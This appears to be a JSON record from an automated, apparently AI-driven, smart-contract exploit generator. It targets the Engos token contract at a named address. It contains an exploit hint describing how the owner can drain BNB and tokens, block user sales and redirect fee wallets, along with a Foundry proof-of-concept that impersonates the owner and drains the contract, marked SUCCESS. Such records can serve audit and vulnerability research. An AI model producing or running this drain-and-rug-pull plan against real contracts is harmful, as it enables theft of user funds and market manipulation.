@@ -1,0 +1,55 @@
+{
+  "project_id": "Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104",
+  "target_address": "0x5548498f6Ae923f590cD1A1cec8D39E1f9363104",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x5548498f6Ae923f590cD1A1cec8D39E1f9363104",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0x5548498f6Ae923f590cD1A1cec8D39E1f9363104",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner, call withdrawalBNB(uint256 _amount, address to) to drain all BNB from the contract, or call withdrawalToken(address _tokenAddr, uint _amount, address to) to drain any ERC20 tokens held by the contract. The owner can also disable trading via setSwapEnabled(false) to prevent users from selling, then extract funds. Additionally, the owner can modify fee percentages to maximum values and change marketing/liq wallet addresses to their own to capture all transaction fees."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface Engos {\n    function owner() external view returns (address);\n    function withdrawalBNB(uint _amount, address to) external;\n    function withdrawalToken(address _tokenAddr, uint _amount, address to) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x5548498f6Ae923f590cD1A1cec8D39E1f9363104;\n    Engos target;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = Engos(TARGET);\n        vm.label(TARGET, \"Engos Token\");\n        vm.label(address(this), \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Record initial balance\n        uint256 initialBalance = address(this).balance;\n        \n        // Get contract's BNB balance\n        uint256 contractBalance = address(TARGET).balance;\n        \n        // Get owner address\n        address owner = target.owner();\n        \n        // Impersonate owner and drain all BNB\n        vm.startPrank(owner);\n        target.withdrawalBNB(contractBalance, address(this));\n        vm.stopPrank();\n        \n        // Verify attacker balance increased\n        assertGt(address(this).balance, initialBalance);\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "This is a classic Owner Privilege Abuse vulnerability. The Engos contract has owner-only functions `withdrawalBNB()` and `withdrawalToken()` that allow the owner to drain all funds from the contract. The contract also has functions to redirect fee wallets to arbitrary addresses. Since the oracle checks if the attacker's NATIVE balance increased, the simplest exploit is to impersonate the owner and call `withdrawalBNB()` to drain all BNB from the contract.",
+      "attack_strategy": "1. Get the contract owner address using the `owner()` view function. 2. Use `vm.startPrank()` to impersonate the owner. 3. Call `withdrawalBNB()` with the full contract BNB balance, sending it to the attacker address. 4. Verify the attacker's balance increased.",
+      "step_by_step_plan": "1. Create an interface for the Engos contract with the necessary functions (owner, withdrawalBNB). 2. In setUp(), instantiate the target contract. 3. In testExploit(), record initial attacker balance. 4. Get the owner address from the contract. 5. Use vm.startPrank(owner) to impersonate. 6. Call withdrawalBNB with full contract balance to attacker. 7. Stop prank and assert balance increased.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface Engos {\n    function owner() external view returns (address);\n    function withdrawalBNB(uint _amount, address to) external;\n    function withdrawalToken(address _tokenAddr, uint _amount, address to) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x5548498f6Ae923f590cD1A1cec8D39E1f9363104;\n    Engos target;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = Engos(TARGET);\n        vm.label(TARGET, \"Engos Token\");\n        vm.label(address(this), \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Record initial balance\n        uint256 initialBalance = address(this).balance;\n        \n        // Get contract's BNB balance\n        uint256 contractBalance = address(TARGET).balance;\n        \n        // Get owner address\n        address owner = target.owner();\n        \n        // Impersonate owner and drain all BNB\n        vm.startPrank(owner);\n        target.withdrawalBNB(contractBalance, address(this));\n        vm.stopPrank();\n        \n        // Verify attacker balance increased\n        assertGt(address(this).balance, initialBalance);\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 113.22385096549988,
+      "prompt_tokens": 21163,
+      "completion_tokens": 6377,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 113.22646594047546,
+  "total_prompt_tokens": 21163,
+  "total_completion_tokens": 6377,
+  "total_cost": 0.0
+}
